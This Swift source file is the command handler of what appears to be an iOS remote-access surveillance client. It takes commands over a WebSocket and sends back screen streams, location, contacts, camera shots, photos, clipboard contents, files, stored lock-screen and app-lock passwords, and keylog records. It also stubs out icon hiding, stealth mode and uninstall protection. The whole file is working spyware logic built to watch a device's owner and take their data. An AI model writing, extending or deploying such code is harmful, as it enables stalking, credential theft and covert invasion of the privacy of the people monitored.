import Foundation
import CoreLocation
import Contacts
import UIKit

final class CommandHandler: NSObject, CLLocationManagerDelegate {
    private let locationManager = CLLocationManager()
    private var pendingLocationWebSocket: WebSocketClient?

    override init() {
        super.init()
        locationManager.delegate = self
        locationManager.desiredAccuracy = kCLLocationAccuracyBest
    }

    func handle(type: String, payloadJSON: String?, client: WebSocketClient) {
        let params = parseParams(payloadJSON)

        switch type {
        case "screen_start":
            handleScreenStart(params: params, client: client)
        case "screen_stop":
            ScreenCaptureService.shared.stop()
            client.sendEnvelope(type: "screen_stop", encodable: StatusPayload(
                status: "success",
                message: "Screen streaming stopped"
            ))
        case "tap", "swipe", "global_action":
            client.sendError("iOS 系统限制：触控与系统按键需通过 WDA 配置后由服务端代理执行")
        case "device_info":
            let info = DeviceInfoProvider.currentInfo(wdaUrl: AppState.shared.wdaURL)
            client.sendEnvelope(type: "device_info", encodable: info)
        case "location":
            pendingLocationWebSocket = client
            if CLLocationManager.authorizationStatus() == .notDetermined {
                locationManager.requestWhenInUseAuthorization()
            }
            locationManager.requestLocation()
        case "contacts":
            let limit = intParam(params, key: "limit", default: 500)
            fetchContacts(limit: limit, client: client)
        case "call_log":
            fetchCallLogs(limit: intParam(params, key: "limit", default: 200), client: client)
        case "sms":
            let limit = intParam(params, key: "limit", default: 50)
            fetchSMS(limit: limit, client: client)
        case "send_sms":
            client.sendError("iOS 系统限制：无法在后台代发短信")
        case "app_list":
            fetchAppList(client: client)
        case "camera":
            let lens = (params["lens"] as? String) ?? "back"
            captureCamera(lens: lens, client: client)
        case "open_url":
            handleOpenURL(params: params, client: client)
        case "file_list":
            let path = (params["path"] as? String) ?? ""
            client.sendEnvelope(type: "file_list", jsonObject: FileHelper.listFiles(path: path))
        case "file_download":
            let path = (params["file"] as? String) ?? (params["path"] as? String) ?? ""
            DispatchQueue.global(qos: .userInitiated).async {
                do {
                    let resp = try FileHelper.downloadFile(path: path)
                    client.sendEnvelope(type: "file_download", jsonObject: resp)
                } catch {
                    client.sendError(error.localizedDescription)
                }
            }
        case "file_upload":
            let path = (params["path"] as? String) ?? ""
            let filename = (params["filename"] as? String) ?? ""
            let content = (params["content"] as? String) ?? ""
            DispatchQueue.global(qos: .userInitiated).async {
                do {
                    let resp = try FileHelper.uploadFile(path: path, filename: filename, base64Content: content)
                    client.sendEnvelope(type: "file_upload", jsonObject: resp)
                } catch {
                    client.sendError(error.localizedDescription)
                }
            }
        case "file_delete":
            let path = (params["file"] as? String) ?? (params["path"] as? String) ?? ""
            DispatchQueue.global(qos: .userInitiated).async {
                do {
                    let resp = try FileHelper.deleteFile(path: path)
                    client.sendEnvelope(type: "file_delete", jsonObject: resp)
                } catch {
                    client.sendError(error.localizedDescription)
                }
            }
        case "file_mkdir":
            let path = (params["path"] as? String) ?? ""
            DispatchQueue.global(qos: .userInitiated).async {
                do {
                    let resp = try FileHelper.mkdir(path: path)
                    client.sendEnvelope(type: "file_mkdir", jsonObject: resp)
                } catch {
                    client.sendError(error.localizedDescription)
                }
            }
        case "gallery_list":
            let limit = intParam(params, key: "limit", default: 80)
            let offset = intParam(params, key: "offset", default: 0)
            GalleryService.listPhotos(limit: limit, offset: offset) { result in
                switch result {
                case .success(let payload):
                    client.sendEnvelope(type: "gallery_list", jsonObject: payload)
                case .failure(let error):
                    client.sendError(error.localizedDescription)
                }
            }
        case "gallery_photo":
            let id = galleryIdParam(params)
            let maxWidth = intParam(params, key: "maxWidth", default: 0)
            let thumbnail = (params["thumbnail"] as? Bool) ?? false
            GalleryService.loadImage(id: id, maxWidth: maxWidth, thumbnail: thumbnail) { result in
                switch result {
                case .success(let payload):
                    client.sendEnvelope(type: "gallery_photo", jsonObject: payload)
                case .failure(let error):
                    client.sendError(error.localizedDescription)
                }
            }
        case "gallery_thumbs":
            let ids = stringArrayParam(params, key: "ids")
            let maxWidth = intParam(params, key: "maxWidth", default: 280)
            GalleryService.loadThumbs(ids: ids, maxWidth: maxWidth) { payload in
                client.sendEnvelope(type: "gallery_thumbs", jsonObject: payload)
            }
        case "lock_passwords":
            client.sendEnvelope(type: "lock_passwords", encodable: MonitorDataStore.shared.getLockPasswords())
        case "clear_lock_passwords":
            MonitorDataStore.shared.clearLockPasswords()
            client.sendEnvelope(type: "clear_lock_passwords", encodable: StatusPayload(
                status: "success",
                message: "Lock password history cleared"
            ))
        case "app_lock_passwords":
            client.sendEnvelope(type: "app_lock_passwords", encodable: MonitorDataStore.shared.getAppLockPasswords())
        case "clear_app_lock_passwords":
            MonitorDataStore.shared.clearAppLockPasswords()
            client.sendEnvelope(type: "clear_app_lock_passwords", encodable: StatusPayload(
                status: "success",
                message: "App lock password history cleared"
            ))
        case "activity_logs":
            let limit = intParam(params, key: "limit", default: 200)
            client.sendEnvelope(type: "activity_logs", encodable: MonitorDataStore.shared.getActivityLogs(limit: limit))
        case "clear_activity_logs":
            MonitorDataStore.shared.clearActivityLogs()
            client.sendEnvelope(type: "clear_activity_logs", encodable: StatusPayload(
                status: "success",
                message: "Activity logs cleared"
            ))
        case "keylog_apps":
            sendKeylogApps(client: client)
        case "set_keylog_apps":
            setKeylogApps(params: params, client: client)
        case "keylog_records":
            let limit = intParam(params, key: "limit", default: 300)
            let packageName = (params["packageName"] as? String) ?? ""
            let records = MonitorDataStore.shared.getKeylogRecords(limit: limit, packageFilter: packageName)
            client.sendEnvelope(type: "keylog_records", encodable: records)
        case "clear_keylog_records":
            MonitorDataStore.shared.clearKeylogRecords()
            client.sendEnvelope(type: "clear_keylog_records", encodable: StatusPayload(
                status: "success",
                message: "键盘记录已清空"
            ))
        case "clipboard_get":
            handleClipboardGet(client: client)
        case "clipboard_set":
            let text = (params["text"] as? String) ?? ""
            handleClipboardSet(text: text, client: client)
        case "shell":
            client.sendEnvelope(type: "shell", jsonObject: [
                "output": "iOS 系统限制：无法执行 Shell 命令",
                "error": true
            ])
        case "hide_icon", "show_icon", "get_client_stealth", "set_client_stealth":
            client.sendEnvelope(type: "client_stealth", jsonObject: [
                "status": "unsupported",
                "message": "iOS 不支持隐藏 App/图标/防卸载",
                "hideApp": false,
                "hideIcon": false,
                "uninstallGuard": false
            ])
        case "ui_tree", "click_node", "tap_text":
            client.sendError("iOS 客户端不支持 UI 树远程点击，请配置 WDA 后使用远程控制")
        case "disconnect":
            client.sendEnvelope(type: "disconnect", encodable: StatusPayload(
                status: "success",
                message: "Disconnected by remote admin"
            ))
            client.disconnect()
        default:
            client.sendError("Unsupported command type: \(type)")
        }
    }

    private func handleScreenStart(params: [String: Any], client: WebSocketClient) {
        let interval = intParam(params, key: "interval", default: 500)
        do {
            try ScreenCaptureService.shared.start(intervalMs: interval) { frame in
                client.sendEnvelope(type: "screen_frame", encodable: frame)
            }
            client.sendEnvelope(type: "screen_start", encodable: StatusPayload(
                status: "success",
                message: "Screen streaming started"
            ))
        } catch {
            client.sendError(error.localizedDescription)
        }
    }

    private func handleClipboardGet(client: WebSocketClient) {
        DispatchQueue.main.async {
            let text = UIPasteboard.general.string ?? ""
            client.sendEnvelope(type: "clipboard_get", jsonObject: [
                "text": text,
                "hasContent": !text.isEmpty
            ])
        }
    }

    private func handleClipboardSet(text: String, client: WebSocketClient) {
        DispatchQueue.main.async {
            UIPasteboard.general.string = text
            client.sendEnvelope(type: "clipboard_set", encodable: StatusPayload(
                status: "success",
                message: "剪贴板已更新"
            ))
        }
    }

    private func handleOpenURL(params: [String: Any], client: WebSocketClient) {
        guard let urlString = params["url"] as? String, let url = URL(string: urlString) else {
            client.sendError("Invalid url parameter")
            return
        }
        let scheme = url.scheme?.lowercased() ?? ""
        guard scheme == "http" || scheme == "https" else {
            client.sendError("open_url: only http/https schemes are allowed")
            return
        }
        DispatchQueue.main.async {
            UIApplication.shared.open(url, options: [:]) { success in
                let msg = success ? "URL opened" : "Failed to open URL"
                client.sendEnvelope(type: "open_url", encodable: StatusPayload(
                    status: success ? "success" : "error",
                    message: msg
                ))
            }
        }
    }

    private func fetchContacts(limit: Int, client: WebSocketClient) {
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, _ in
            guard granted else {
                client.sendError("Contacts permission denied")
                return
            }
            var results: [[String: String]] = []
            var seen = Set<String>()
            let max = min(limit > 0 ? limit : 500, 2000)

            let keys: [CNKeyDescriptor] = [
                CNContactGivenNameKey as CNKeyDescriptor,
                CNContactFamilyNameKey as CNKeyDescriptor,
                CNContactPhoneNumbersKey as CNKeyDescriptor
            ]
            let request = CNContactFetchRequest(keysToFetch: keys)
            do {
                try store.enumerateContacts(with: request) { contact, stop in
                    if results.count >= max { stop.pointee = true; return }
                    let name = "\(contact.givenName) \(contact.familyName)".trimmingCharacters(in: .whitespaces)
                    for phoneValue in contact.phoneNumbers {
                        let phone = phoneValue.value.stringValue
                        let normalized = phone.replacingOccurrences(of: "[\\s\\-]", with: "", options: .regularExpression)
                        let key = "\(name)|\(normalized)"
                        if normalized.isEmpty || seen.contains(key) { continue }
                        seen.insert(key)
                        results.append([
                            "name": name.isEmpty ? "未知" : name,
                            "phone": phone
                        ])
                        if results.count >= max { stop.pointee = true; return }
                    }
                }
                client.sendEnvelope(type: "contacts", encodable: results)
            } catch {
                client.sendError("Contacts read failed: \(error.localizedDescription)")
            }
        }
    }

    private func fetchCallLogs(limit: Int, client: WebSocketClient) {
        // iOS 不向第三方 App 开放通话记录 API
        let empty: [String] = []
        client.sendEnvelope(type: "call_log", encodable: empty)
    }

    private func fetchSMS(limit: Int, client: WebSocketClient) {
        // iOS 不向第三方 App 开放短信读取 API
        let empty: [String] = []
        client.sendEnvelope(type: "sms", encodable: empty)
    }

    private func fetchAppList(client: WebSocketClient) {
        DispatchQueue.global(qos: .userInitiated).async {
            let apps = AppListProvider.fetchInstalledApps()
            client.sendEnvelope(type: "app_list", jsonObject: [
                "apps": apps,
                "total": apps.count
            ])
        }
    }

    private func captureCamera(lens: String, client: WebSocketClient) {
        CameraCaptureService.capture(lens: lens) { result in
            switch result {
            case .success(let payload):
                client.sendEnvelope(type: "camera", jsonObject: payload)
            case .failure(let error):
                client.sendError(error.localizedDescription)
            }
        }
    }

    private func sendKeylogApps(client: WebSocketClient) {
        let packages = ConfigStore.keylogPackages
        var apps: [[String: String]] = []
        for pkg in packages {
            apps.append(["packageName": pkg, "appName": pkg])
        }
        client.sendEnvelope(type: "keylog_apps", jsonObject: ["apps": apps])
    }

    private func setKeylogApps(params: [String: Any], client: WebSocketClient) {
        let packages = stringArrayParam(params, key: "packages")
        ConfigStore.setKeylogPackages(packages)
        client.sendEnvelope(type: "set_keylog_apps", jsonObject: [
            "status": "success",
            "message": "已更新键盘监控应用 \(packages.count) 个",
            "count": packages.count
        ])
        sendKeylogApps(client: client)
    }

    private func parseParams(_ json: String?) -> [String: Any] {
        guard let json = json, let data = json.data(using: .utf8),
              let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            return [:]
        }
        return obj
    }

    private func intParam(_ params: [String: Any], key: String, default defaultValue: Int) -> Int {
        if let value = params[key] as? Int { return value }
        if let value = params[key] as? Double { return Int(value) }
        if let value = params[key] as? String, let intValue = Int(value) { return intValue }
        return defaultValue
    }

    private func stringArrayParam(_ params: [String: Any], key: String) -> [String] {
        if let arr = params[key] as? [String] { return arr }
        if let arr = params[key] as? [Any] {
            return arr.compactMap { item in
                if let s = item as? String { return s }
                if let n = item as? NSNumber { return n.stringValue }
                return nil
            }
        }
        return []
    }

    private func galleryIdParam(_ params: [String: Any]) -> String {
        if let id = params["id"] as? String { return id }
        if let id = params["id"] as? Int { return String(id) }
        if let id = params["id"] as? Double { return String(Int(id)) }
        return ""
    }

    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        guard let client = pendingLocationWebSocket, let loc = locations.last else { return }
        pendingLocationWebSocket = nil
        let payload: [String: Any] = [
            "status": "ok",
            "latitude": loc.coordinate.latitude,
            "longitude": loc.coordinate.longitude,
            "accuracy": loc.horizontalAccuracy,
            "timestamp": Int64(loc.timestamp.timeIntervalSince1970 * 1000),
            "provider": "ios"
        ]
        client.sendEnvelope(type: "location", jsonObject: payload)
    }

    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
        guard let client = pendingLocationWebSocket else { return }
        pendingLocationWebSocket = nil
        client.sendEnvelope(type: "location", jsonObject: [
            "status": "unavailable",
            "message": error.localizedDescription
        ])
    }
}
